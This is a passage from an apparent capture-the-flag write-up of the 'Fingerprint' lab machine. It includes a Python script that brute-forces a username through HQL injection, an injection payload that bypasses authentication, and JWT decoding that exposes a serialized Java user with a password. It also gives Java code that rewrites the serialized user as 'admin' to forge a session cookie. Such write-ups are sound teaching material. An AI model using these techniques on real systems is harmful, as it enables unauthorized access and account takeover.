<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line">10.129.118.212 - - [17/Apr/2022 10:44:09] <span class="string">&quot;GET /login.js HTTP/1.1&quot;</span> 200 -</span><br><span class="line">10.129.118.212 - - [17/Apr/2022 10:44:09] code 404, message File not found</span><br><span class="line">10.129.118.212 - - [17/Apr/2022 10:44:09] <span class="string">&quot;GET /962f4a03aa7ebc0515734cf398b0ccd6 HTTP/1.1&quot;</span> 404 -</span><br></pre></td></tr></table></figure>

<p>Let’s now try to log in using this fingerprint ID and the information we retrieved earlier:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/163711238-ccb7eb49-75ed-4bc9-8c9c-11b45833335f.png" alt="https://user-images.githubusercontent.com/9076747/163711238-ccb7eb49-75ed-4bc9-8c9c-11b45833335f.png"></p>
<p>But unfortunately, we get hit with an <code>Invalid fingerprint-ID</code> error again.<br>This means the fingerprint we retrieved is not from <code>admin</code> but from the other user we found in the database.</p>
<p>Let’s go back a little and create a quick and dirty enumeration script to retrieve this second user username:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> string.ascii_letters:</span><br><span class="line">    r = requests.post(<span class="string">&quot;http://fingerprint.htb:8080/login&quot;</span>, data=<span class="string">f&quot;uid=x&#x27; OR SUBSTRING(username,1,1)=&#x27;<span class="subst">&#123;c&#125;</span>&#x27; and &#x27;&#x27;=&#x27;&amp;auth_primary=x&amp;auth_secondary=962f4a03aa7ebc0515734cf398b0ccd6&quot;</span>, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Sign In&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] Found username first char: <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure>

<p>After too many failed attempts we get blocked by the server so we can’t retrieve the full username. But it’s ok, the first character is enough for the injection:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python get_username.py</span><br><span class="line">[!] Found username first char: m</span><br></pre></td></tr></table></figure>

<h3 id="Authentication-Bypass"><a href="#Authentication-Bypass" class="headerlink" title="Authentication Bypass"></a>Authentication Bypass</h3><p>Chaining the HQL Injection and the XSS vulnerability we can create our final payload which allow us to bypass the authentication form:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid<span class="operator">=</span>x<span class="string">&#x27; OR SUBSTRING(username,1,1)=&#x27;</span>m<span class="string">&#x27; and &#x27;&#x27;=&#x27;</span><span class="operator">&amp;</span>auth_primary<span class="operator">=</span>x<span class="operator">&amp;</span>auth_secondary<span class="operator">=</span><span class="number">962</span>f4a03aa7ebc0515734cf398b0ccd6</span><br></pre></td></tr></table></figure>

<p><img src="https://user-images.githubusercontent.com/9076747/163713586-c0015a06-3f13-41cb-a726-57670cd7b86d.png" alt="https://user-images.githubusercontent.com/9076747/163713586-c0015a06-3f13-41cb-a726-57670cd7b86d.png"></p>
<p>We access an image uploading website. Playing around with it we can see that all files uploaded end up in an images folder but there doesn’t seem to be any way to exploit it. </p>
<p>Once again, when being stuck let’s go back for more recon to see if any useful information can be found. </p>
<h3 id="Backups"><a href="#Backups" class="headerlink" title="Backups"></a>Backups</h3><p>While taking a closer look at the HTTP request we can notice the cookie being set when login contains <a target="_blank" rel="noopener" href="https://www.baeldung.com/java-serialization">serialized</a> information, including the username we couldn’t fully ex-filtrate earlier, it’s <code>micheal1235</code>.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ JWT=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoick8wQUJYTnlBQ0ZqYjIwdVlXUnRhVzR1YzJWamRYSnBkSGt1YzNKakxtMXZaR1ZzTGxWelpYS1VCTmR6NDErNWF3SUFCRWtBQW1sa1RBQUxabWx1WjJWeWNISnBiblIwQUJKTWFtRjJZUzlzWVc1bkwxTjBjbWx1Wnp0TUFBaHdZWE56ZDI5eVpIRUFmZ0FCVEFBSWRYTmxjbTVoYldWeEFINEFBWGh3QUFBQUFuUUFRRGRsWmpVeVl6STFNV1k0TURRMFkySXhPRGN3TVRNNU9USTRPVEZrTUdVMU9HTmxPVEU1TkdSbE4yWTFNelZpTVdJMFptRTJZbUptWlRBNE5qYzRaalowQUJSTVYyYzNaMVZTTVVWdFdEZFZUbmh6U25oeFduUUFDMjFwWTJobFlXd3hNak0xIn0.6dfequ2JzMYm2A6wgo6SU_pJWzWgqmGaChbRiXiEgTw</span><br><span class="line">[hg8@archbook ~]$ jq -R <span class="string">&#x27;split(&quot;.&quot;) | .[1] | @base64d | fromjson&#x27;</span> &lt;&lt;&lt; <span class="string">&quot;<span class="variable">$JWT</span>&quot;</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;user&quot;</span>: <span class="string">&quot;rO0ABXNyACFjb20uYWRtaW4uc2VjdXJpdHkuc3JjLm1vZGVsLlVzZXKUBNdz41+5awIABEkAAmlkTAALZmluZ2VycHJpbnR0ABJMamF2YS9sYW5nL1N0cmluZztMAAhwYXNzd29yZHEAfgABTAAIdXNlcm5hbWVxAH4AAXhwAAAAAnQAQDdlZjUyYzI1MWY4MDQ0Y2IxODcwMTM5OTI4OTFkMGU1OGNlOTE5NGRlN2Y1MzViMWI0ZmE2YmJmZTA4Njc4ZjZ0ABRMV2c3Z1VSMUVtWDdVTnhzSnhxWnQAC21pY2hlYWwxMjM1&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;rO0ABXNyACFjb20uYWRtaW4uc2VjdXJpdHkuc3JjLm1vZGVsLlVzZXKUBNdz41+5awIABEkAAmlkTAALZmluZ2VycHJpbnR0ABJMamF2YS9sYW5nL1N0cmluZztMAAhwYXNzd29yZHEAfgABTAAIdXNlcm5hbWVxAH4AAXhwAAAAAnQAQDdlZjUyYzI1MWY4MDQ0Y2IxODcwMTM5OTI4OTFkMGU1OGNlOTE5NGRlN2Y1MzViMWI0ZmE2YmJmZTA4Njc4ZjZ0ABRMV2c3Z1VSMUVtWDdVTnhzSnhxWnQAC21pY2hlYWwxMjM1&quot;</span> | base64 -d</span><br><span class="line">�sr!com.admin.security.src.model.User��kIidL fingerprinttLjava/lang/String;passwordq~usernameq~xpt@7ef52c251f8044cb187013992891d0e58ce9194de7f535b1b4fa6bbfe08678f6tLWg7gUR1EmX7UNxsJxqZt micheal1235%</span><br></pre></td></tr></table></figure>

<p>While continuing the recon with <code>gobuster</code> we find two Java files in the <code>/backups/</code>folder: <code>[User.java](http://User.java)</code> and <code>Profile.java</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// http://fingerprint.htb:8080/backups/Profile.java</span></span><br><span class="line"><span class="keyword">package</span> com.admin.security.src.model;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.admin.security.src.profile.UserProfileStorage;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Profile</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">3995854114743474071L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;String&gt; logs;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">boolean</span> adminProfile;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> File avatar;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Profile <span class="title">getForUser</span><span class="params">(<span class="keyword">final</span> User user)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// fetch locally saved profile</span></span><br><span class="line">        <span class="keyword">final</span> File file = user.getProfileLocation();</span><br><span class="line"></span><br><span class="line">        Profile profile;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!file.isFile()) &#123;</span><br><span class="line">            <span class="comment">// no file -&gt; create empty profile</span></span><br><span class="line">            profile = <span class="keyword">new</span> Profile(<span class="keyword">new</span> ArrayList&lt;&gt;(), user.isAdmin());</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                user.updateProfile(profile);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> IOException ignored) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// init logs etc.</span></span><br><span class="line">        profile = <span class="keyword">new</span> UserProfileStorage(user).readProfile();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> profile;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// http://fingerprint.htb:8080/backups/User.java</span></span><br><span class="line"><span class="keyword">package</span> com.admin.security.src.model;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.admin.security.src.utils.FileUtil;</span><br><span class="line"><span class="keyword">import</span> com.admin.security.src.utils.SerUtils;</span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.persistence.*;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="comment">// import com.admin.security.src.model.UserProfileStorage;</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@Table(name = &quot;users&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">7780857363453462165L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Id</span></span><br><span class="line">    <span class="meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span></span><br><span class="line">    <span class="meta">@Column(name = &quot;id&quot;)</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> id;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Column(name = &quot;username&quot;)</span></span><br><span class="line">    <span class="keyword">protected</span> String username;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Column(name = &quot;password&quot;)</span></span><br><span class="line">    <span class="keyword">protected</span> String password;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Column(name = &quot;fingerprint&quot;)</span></span><br><span class="line">    <span class="keyword">protected</span> String fingerprint;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> File <span class="title">getProfileLocation</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> File dir = <span class="keyword">new</span> File(<span class="string">&quot;/data/sessions/&quot;</span>);</span><br><span class="line">        dir.mkdirs();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> String pathname = dir.getAbsolutePath() + <span class="string">&quot;/&quot;</span> + username + <span class="string">&quot;.ser&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> Paths.get(pathname).normalize().toFile();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isAdmin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> username.equals(<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">updateProfile</span><span class="params">(<span class="keyword">final</span> Profile profile)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">byte</span>[] res = SerUtils.toByteArray(profile);</span><br><span class="line">        FileUtil.write(res, getProfileLocation());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>We can see here the application logic of session management and understand how the serialized token we found in our cookie is being created.</p>
<p>An interesting line is the quite simple <code>isAdmin()</code> check:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isAdmin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> username.equals(<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>This means if we get control of just the <code>username</code> field only we can become Admin of the application.</p>
<h3 id="Admin-cookie-forging"><a href="#Admin-cookie-forging" class="headerlink" title="Admin cookie forging"></a>Admin cookie forging</h3><p>Earlier when we retrieve the <code>[app.py](http://app.py)</code> file of the main application we obtained the <code>SECRET_KEY</code> which, in a Flask application, is used to sign session token (JWT). If we can rewrite the serialized cookie to replace the username with <code>admin</code> we will be able to forge a valid JWT token to give us access to the <code>admin</code> account.</p>
<p>Using the code source of the <code>[User.java](http://User.java)</code> we retrieved earlier we can create a script to revert the serialize function after modifying our username to <code>admin</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// com/admin/security/src/model/AdminSerialize.java</span></span><br><span class="line"><span class="keyword">package</span> com.admin.security.src.model;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminSerialize</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] serializedUserBytes = Base64.getDecoder().decode(<span class="string">&quot;rO0ABXNyACFjb20uYWRtaW4uc2VjdXJpdHkuc3JjLm1vZGVsLlVzZXKUBNdz41+5awIABEkAAmlkTAALZmluZ2VycHJpbnR0ABJMamF2YS9sYW5nL1N0cmluZztMAAhwYXNzd29yZHEAfgABTAAIdXNlcm5hbWVxAH4AAXhwAAAAAnQAQDdlZjUyYzI1MWY4MDQ0Y2IxODcwMTM5OTI4OTFkMGU1OGNlOTE5NGRlN2Y1MzViMWI0ZmE2YmJmZTA4Njc4ZjZ0ABRMV2c3Z1VSMUVtWDdVTnhzSnhxWnQAC21pY2hlYWwxMjM1&quot;</span>);</span><br><span class="line">            ByteArrayInputStream serializedUserInputStream = <span class="keyword">new</span> ByteArrayInputStream(serializedUserBytes);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// https://gist.github.com/andy722/1524968</span></span><br><span class="line">            ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(serializedUserInputStream);</span><br><span class="line">            User user = (User)objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Cookie user information deserialized.&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;ID: &quot;</span> + user.getId());</span><br><span class="line">            System.out.println(<span class="string">&quot;Username: &quot;</span> + user.getUsername());</span><br><span class="line">            System.out.println(<span class="string">&quot;Password: &quot;</span> + user.getPassword());</span><br><span class="line">            System.out.println(<span class="string">&quot;Fingerprint: &quot;</span> + user.getFingerprint());</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;\n[+] Replacing username to &#x27;admin&#x27; and serializing the Object.&quot;</span>);</span><br><span class="line">            user.setUsername(<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;ID: &quot;</span> + user.getId());</span><br><span class="line">            System.out.println(<span class="string">&quot;Username: &quot;</span> + user.getUsername());</span><br><span class="line">            System.out.println(<span class="string">&quot;Password: &quot;</span> + user.getPassword());</span><br><span class="line">            System.out.println(<span class="string">&quot;Fingerprint: &quot;</span> + user.getFingerprint());</span><br><span class="line"></span><br><span class="line">            ByteArrayOutputStream serializedUserOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(serializedUserOutputStream);</span><br><span class="line">            objectOutputStream.writeObject(user);</span><br><span class="line"></span><br><span class="line">            String serializedAdminUserBase64 = Base64.getEncoder().encodeToString(serializedUserOutputStream.toByteArray());</span><br><span class="line">            System.out.println(<span class="string">&quot;\n[+] Serialization of the new user. \n&quot;</span> + serializedAdminUserBase64);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IOException | ClassNotFoundException ex) &#123;</span><br><span class="line">            System.out.println(ex.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// com/admin/security/src/model/User.java</span></span><br><span class="line"><span class="keyword">package</span> com.admin.security.src.model;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">7780857363453462165L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">private</span> String fingerprint;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        id = <span class="number">0</span>;</span><br><span class="line">        username = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        password = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        fingerprint = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">getPassword</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">getFingerprint</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> fingerprint;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setUsername</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setPassword</span><span class="params">(String password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setFingerPrint</span><span class="params">(String fingerprint)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.fingerprint = fingerprint;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ javac com/admin/security/src/model/AdminSerialize.java</span><br><span class="line">[hg8@archbook ~]$ java com.admin.security.src.model.AdminSerialize</span><br><span class="line">[+] Cookie user information deserialized.</span><br><span class="line">ID: 2</span><br><span class="line">Username: micheal1235</span><br><span class="line">Password: LWg7gUR1EmX7UNxsJxqZ</span><br><span class="line">Fingerprint: 7ef52c251f8044cb187013992891d0e58ce9194de7f535b1b4fa6bbfe08678f6</span><br><span class="line"></span><br><span class="line">[+] Replacing username to <span class="string">&#x27;admin&#x27;</span> and serializing the Object.</span><br><span class="line">ID: 2</span><br><span class="line">Username: admin</span><br><span class="line">Password: LWg7gUR1EmX7UNxsJxqZ</span><br><span class="line">Fingerprint: 7ef52c251f8044cb187013992891d0e58ce9194de7f535b1b4fa6bbfe08678f6</span><br><span class="line"></span><br><span class="line">[+] Serialization of the new user.</span><br><span class="line">rO0ABXNyACFjb20uYWRtaW4uc2VjdXJpdHkuc3JjLm1vZGVsLlVzZXKUBNdz41+5awIABEkAAmlkTAALZmluZ2VycHJpbnR0ABJMamF2YS9sYW5nL1N0cmluZztMAAhwYXNzd29yZHEAfgABTAAIdXNlcm5hbWVxAH4AAXhwAAAAAnQAQDdlZjUyYzI1MWY4MDQ0Y2IxODcwMTM5OTI4OTFkMGU1OGNlOTE5NGRlN2Y1MzViMWI0ZmE2YmJmZTA4Njc4ZjZ0ABRMV2c3Z1VSMUVtWDdVTnhzSnhxWnQABWFkbWlu</span><br></pre></td></tr></table></figure>

<p>Let’s use <a target="_blank" rel="noopener" href="http://jwt.io/">jwt.io</a> to forge the new JWT:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/163730221-3b859aa4-7448-4a39-b7fa-26169416626c.png" alt="https://user-images.githubusercontent.com/9076747/163730221-3b859aa4-7448-4a39-b7fa-26169416626c.png"></p>
